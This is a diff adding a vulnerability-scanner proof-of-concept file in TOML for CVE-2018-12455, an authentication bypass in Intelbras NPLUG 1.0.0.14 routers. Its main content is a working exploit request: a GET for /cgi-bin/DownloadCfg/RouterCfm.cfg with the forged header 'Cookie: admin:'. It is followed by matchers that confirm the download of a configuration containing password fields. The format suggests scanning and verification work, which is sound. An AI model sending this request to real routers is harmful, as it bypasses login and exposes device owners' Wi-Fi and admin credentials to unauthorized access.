@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "验证 Intelbras NPLUG 1.0.0.14 身份认证绕过漏洞，通过设置 Cookie: admin: 绕过登录直接下载路由器配置文件"
+id = "POC-AVE-2018-0070"
+name = "CVE-2018-12455 PoC"
+severity = "high"
+tags = ["ave-2018-0070"]
+vuln_id = [
+    "CVE-2018-12455",
+    "AVE-2018-0070",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/DownloadCfg/RouterCfm.cfg"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "admin:"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["config/conf"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "wl_",
+    "_passwd",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
